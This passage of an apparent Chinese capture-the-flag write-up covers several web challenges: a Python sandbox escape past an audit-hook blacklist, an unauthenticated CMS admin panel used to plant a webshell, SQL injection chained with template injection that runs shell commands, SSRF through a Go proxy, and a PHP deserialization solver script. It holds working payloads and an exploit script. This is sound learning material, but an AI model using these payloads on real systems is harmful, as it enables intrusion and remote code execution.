class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;⁽&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;⁾&#x27;</span>).replace(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;＇&#x27;</span>).replace(<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;﹟&#x27;</span>).replace(<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;［&#x27;</span>).replace(<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;］&#x27;</span>).replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;⁼&#x27;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;＂&#x27;</span>).replace(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;․&#x27;</span>).replace(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;：&#x27;</span>).replace(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;／&#x27;</span>).replace(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;－&#x27;</span>).replace(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;﹥&#x27;</span>))<br></code></pre></td></tr></table></figure><p>现在绕过第一步了，第二步到了要rce的地方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_audit_hook</span>(<span class="hljs-params">event_name, arg</span>):<br>    blacklist = [<span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>, <span class="hljs-string">&quot;memoryview&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(event_name) &gt; <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Too Long!&quot;</span>)<br>    <span class="hljs-keyword">for</span> bad <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> bad <span class="hljs-keyword">in</span> event_name:<br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;No!&quot;</span>)<br><br><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).addaudithook(my_audit_hook)<br></code></pre></td></tr></table></figure><p>我们传入的东西都会进这个hook，AST 沙箱会将用户的输入转化为操作码，此时字符串层面的变换基本上没用了。但是这里没有过滤os和system，所以我们可以直接<code>__import__(&quot;os&quot;).system(&quot;whoami&quot;)</code></p><p>但是len(event_name)有限制，会检测os.system，我们的长度肯定是超过了的。</p><p>但是我们可以通过覆盖len函数，来绕过长度限制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.<span class="hljs-built_in">len</span> = <span class="hljs-keyword">lambda</span> x:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后直接rce了（直接import可能会有问题，但是我本地可以，远程可以用继承链打。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a＇⁾\n＿＿builtins＿＿․<span class="hljs-built_in">len</span> ⁼ <span class="hljs-keyword">lambda</span> x：<span class="hljs-number">1</span>\n＿＿<span class="hljs-keyword">import</span>＿＿⁽＇os＇⁾․system⁽＇whoami＇⁾﹟<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">a＇⁾＃\n＿＿builtins＿＿․len ⁼ lambda x：<span class="hljs-number">1</span>\n\n［ x․＿＿init＿＿․＿＿globals＿＿ <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ＇＇․＿＿<span class="hljs-keyword">class</span>＿＿․＿＿<span class="hljs-symbol">base</span>＿＿․＿＿<span class="hljs-symbol">subclasses</span>＿＿⁽⁾ <span class="hljs-symbol">if</span> <span class="hljs-symbol">x</span>․＿＿<span class="hljs-symbol">name</span>＿＿⁼⁼＂＿<span class="hljs-symbol">wrap</span>＿<span class="hljs-symbol">close</span>＂］［<span class="hljs-symbol">0</span>］［＂<span class="hljs-symbol">system</span>＂］⁽＂<span class="hljs-symbol">ls</span> ／－<span class="hljs-symbol">al</span>＂⁾＃<br></code></pre></td></tr></table></figure><p><img src="/img/qwb2024/b017e470-feda-4a53-96d2-90a7133a1505.png" alt="b017e470-feda-4a53-96d2-90a7133a1505"></p><p>需要提权</p><p><img src="/img/qwb2024/cd60b7cd-e902-477d-ab12-d4fe477b4460.png" alt="cd60b7cd-e902-477d-ab12-d4fe477b4460"></p><p>参考gtfobins： <a href="https://r0yanx.com/gtfobins/dd/">https://r0yanx.com/gtfobins/dd/</a></p><p><img src="/img/qwb2024/f1abf556-2db2-48f5-9881-8557a07d55a7.png" alt="f1abf556-2db2-48f5-9881-8557a07d55a7"></p><h1 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h1><p>废话1：</p><p>&#x2F;search?keyword&#x3D;1 这里sqlmap可以嗦数据库所有内容，但是admin的密码是加盐的md5，无法爆破。</p><p>废话2：拿到小浣熊CMS源码，全局搜admin</p><p><img src="/img/qwb2024/image-20241102175555820.png" alt="image-20241102175555820"></p><p>在admin的登录逻辑，是设置了session为{“xwx_admin”:username}，可爱捏，但是很煞笔捏，哪有网站明文session啊？</p><p>所以我们注册一个账号，手动添加cookie：xwx_admin:Infernity</p><p>然后进去&#x2F;admin&#x2F;admins就可以到后台页面了。</p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>上面全是错的，根本不需要登录，也不需要cookie，直接就可以他妈的进后台管理页面。</p><p>然后进入&#x2F;admin&#x2F;payment&#x2F;index页面，这里有file_put_contens函数，可以写马进去，这个payment.php会在各个地方都有包含，写个马进去随便找个地方就可以rce了。</p><p><img src="/img/qwb2024/image-20241102180328083.png" alt="image-20241102180328083"></p><p><img src="/img/qwb2024/463bfe36-1624-4920-9010-18dca2a664c1.png" alt="463bfe36-1624-4920-9010-18dca2a664c1"></p><p><img src="/img/qwb2024/66a4ccf3-2497-4c28-a5d6-d12796834f95.png" alt="66a4ccf3-2497-4c28-a5d6-d12796834f95"></p><h1 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h1><p>把每次行动延时改为0.4秒，手打50分就通关了。（打了四遍QAQ）</p><p>setInterval(update, 400);</p><p>胜利页面：<code>/snake_win?username=admin</code>可以xss没啥用</p><p>经过测试发现可以sql注入，数据库是sqllite的：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">/snake_win?username=a<span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,sqlite_version()<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>后面查表查数据没找到任何有用的东西，最后发现是结合了ssti。&#x3D;-&#x3D;</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">a<span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&#123;&#123;7*7&#125;&#125;&quot;</span>) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="/img/qwb2024/42945632-6661-4760-b130-3559fd11e990.png" alt="42945632-6661-4760-b130-3559fd11e990"></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">a&#x27;union select 1,2,(select &quot;</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;</span><span class="language-xml">&quot;)--</span><br></code></pre></td></tr></table></figure><p><img src="/img/qwb2024/a2e4f41f-7361-42a5-a884-4ad919838dc0.png" alt="a2e4f41f-7361-42a5-a884-4ad919838dc0"></p><p>有点脑洞了。</p><h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br><br>v1 := r.Group(<span class="hljs-string">&quot;/v1&quot;</span>)<br>&#123;<br>v1.POST(<span class="hljs-string">&quot;/api/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>cmd := exec.Command(<span class="hljs-string">&quot;/readflag&quot;</span>)<br>flag, err := cmd.CombinedOutput()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.JSON(http.StatusOK, gin.H&#123;<span class="hljs-string">&quot;flag&quot;</span>: flag&#125;)<br>&#125;)<br>&#125;<br><br>v2 := r.Group(<span class="hljs-string">&quot;/v2&quot;</span>)<br>&#123;<br>v2.POST(<span class="hljs-string">&quot;/api/proxy&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> proxyRequest ProxyRequest<br><span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid request&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>client := &amp;http.Client&#123;<br>CheckRedirect: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request, via []*http.Request)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> !req.URL.IsAbs() &#123;<br><span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>&#125;<br><br><span class="hljs-keyword">if</span> !proxyRequest.FollowRedirects &#123;<br><span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;,<br>&#125;<br><br>req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="hljs-type">byte</span>(proxyRequest.Body)))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> proxyRequest.Headers &#123;<br>req.Header.Set(key, value)<br>&#125;<br><br>resp, err := client.Do(req)<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br>body, err := io.ReadAll(resp.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.Status(resp.StatusCode)<br><span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> resp.Header &#123;<br>c.Header(key, value[<span class="hljs-number">0</span>])<br>&#125;<br><br>c.Writer.Write(body)<br>c.Abort()<br>&#125;)<br>&#125;<br><br>r.Run(<span class="hljs-string">&quot;127.0.0.1:8769&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>获取flag的路由在<code>/v1/api/readflag</code></p><p>但是nginx限制了<code>/v1</code>路由的访问</p><p><img src="/img/qwb2024/7b01c938-7b34-4e02-b3c9-606952c15ec3.png" alt="7b01c938-7b34-4e02-b3c9-606952c15ec3"></p><p>但是<code>/v2/api/proxy</code>这个路由可以构造一个url请求，绕过中间件去访问<code>/v1/api/readflag</code>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">req, err := http<span class="hljs-selector-class">.NewRequest</span>(proxyRequest<span class="hljs-selector-class">.Method</span>, proxyRequest<span class="hljs-selector-class">.URL</span>, bytes<span class="hljs-selector-class">.NewReader</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(proxyRequest.Body)))<br></code></pre></td></tr></table></figure><p>所以只需要v2 发一个post请求过去就行：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;URL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Method&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;POST&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Body&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/img/qwb2024/image-20241103135058428.png" alt="image-20241103135058428" style="zoom:67%;" /><p>flag{a156a702-6a71-4ebe-83bf-8cb7492c913f}</p><h1 id="Password-Game"><a href="#Password-Game" class="headerlink" title="Password Game"></a>Password Game</h1><p>他会要求你的密码满足以下几个条件：</p><ol><li>至少包含数字和大小写字母</li><li>密码中所有数字之和必须为xx的倍数</li><li>请密码中包含下列算式的解(如有除法，则为整除): xxxx &#x2F; xxx</li></ol><p>密码都满足后，会给一个源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$password</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;2024qwb&quot;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nonono&quot;</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">guest</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username==<span class="hljs-string">&quot;guest&quot;</span>)&#123;<br>            <span class="hljs-variable">$value</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">root</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;value == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;hello:&quot;</span>.<span class="hljs-variable">$this</span>-&gt;value);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;password-&gt;<span class="hljs-title function_ invoke__">guess</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> )&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$user</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$user</span>-&gt;password == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化链子在password里触发，所以还是得满足密码条件，加上序列化字符串里有数字，这里写个脚本：</p><p>25%左右成功率吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://eci-2ze420okq7lsn5wjipao.cloudeci1.ichunqiu.com/&quot;</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:9:&quot;Infernity&quot;;s:8:&quot;password&quot;;N;s:5:&quot;value&quot;;N;&#125;&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check1</span>(<span class="hljs-params">number</span>):<br>    x9 = <span class="hljs-built_in">int</span>(number)//<span class="hljs-number">9</span>    <span class="hljs-comment">#多少个9</span><br>    yushu = <span class="hljs-built_in">int</span>(number)%<span class="hljs-number">9</span>  <span class="hljs-comment">#余数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;9&quot;</span>*x9+<span class="hljs-built_in">str</span>(yushu)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check2</span>(<span class="hljs-params">number,xxbeishu,payload</span>):<br>    total = <span class="hljs-number">0</span><br>    xxbeishu = <span class="hljs-built_in">int</span>(xxbeishu)*<span class="hljs-number">5</span>     <span class="hljs-comment">#先把倍数变大，不然可能会出现负数</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(number)-<span class="hljs-number">1</span>):  <span class="hljs-comment">#遍历每一个数字加起来</span><br>        total += <span class="hljs-built_in">int</span>(number[i])<br>    temp = xxbeishu-total-check3(payload)        <span class="hljs-comment">#减去第三步需要的数字</span><br>    <span class="hljs-keyword">return</span> number+check1(temp)          <span class="hljs-comment">#把剩下不够的数字用check1来补9和余数</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check3</span>(<span class="hljs-params">payload</span>):<span class="hljs-comment">#检查payload里的数字</span><br>    numbers = re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, payload)<br>    total_sum = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> numbers)<br>    <span class="hljs-keyword">return</span> total_sum<br><br><br>sess = requests.Session()<br>sess.post(url+<span class="hljs-string">&quot;/index.php?action=start&quot;</span>, data=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>&#125;)<br><br>res1 = sess.post(url + <span class="hljs-string">&quot;/game.php&quot;</span>, data=&#123;<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;Aa132&quot;</span>&#125;) <span class="hljs-comment">#拿密码中所有数字之和必须为xx的倍数</span><br>xxbeishu = re.search(<span class="hljs-string">r&quot;密码中所有数字之和必须为(\d+)的倍数&quot;</span>, res1.text)<br>nextpass = check1(xxbeishu[<span class="hljs-number">1</span>])<br><br>res2 = sess.post(url + <span class="hljs-string">&quot;/game.php&quot;</span>, data=&#123;<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;Aa&quot;</span>+nextpass&#125;)<br>shuanshi = re.search(<span class="hljs-string">r&quot;(\d+)\s*([\+\-\*/])\s*(\d+)&quot;</span>, res2.text)<br><br>num1 = <span class="hljs-built_in">int</span>(shuanshi[<span class="hljs-number">1</span>])<br>fuhao = shuanshi[<span class="hljs-number">2</span>]<br>num2 = <span class="hljs-built_in">int</span>(shuanshi[<span class="hljs-number">3</span>])<br><br><span class="hljs-keyword">match</span> fuhao:<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;+&quot;</span>:<br>        result = num1+num2<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;-&quot;</span>:<br>        result = num1-num2<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;*&quot;</span>:<br>        result = num1*num2<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;/&quot;</span>:<br>        result = num1//num2<br><br>nextpass = check2(<span class="hljs-built_in">str</span>(result),xxbeishu[<span class="hljs-number">1</span>],payload)<br>res3 = sess.post(url + <span class="hljs-string">&quot;/game.php&quot;</span>, data=&#123;<span class="hljs-string">&quot;password&quot;</span>: payload + <span class="hljs-string">&quot;Aa&quot;</span>+nextpass&#125;)<br><span class="hljs-built_in">print</span>(res3.text)<br></code></pre></td></tr></table></figure><p><img src="/img/qwb2024/6CE905E5C9FB20DD0B3960A6C1666DB7.png" alt="6CE905E5C9FB20DD0B3960A6C1666DB7"></p><p><img 